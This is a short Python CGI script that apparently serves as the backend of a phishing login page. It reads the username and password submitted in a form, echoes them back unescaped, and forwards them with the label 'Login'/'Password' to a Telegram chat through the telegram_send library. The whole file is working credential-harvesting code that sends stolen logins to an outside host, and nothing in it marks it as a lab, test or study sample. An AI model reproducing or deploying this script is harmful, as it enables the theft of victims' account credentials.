#!/usr/bin/env python3


import telegram_send as ts
import cgi

our_form = cgi.FieldStorage()
in_name = our_form.getfirst("in_name","not found")
in_pass = our_form.getfirst("in_pass","not found")

print("Content-type: text/html")
print()
print(in_name)
print(in_pass)


ts.send(messages=["Login: " + in_name + "\nPassword: " + in_pass])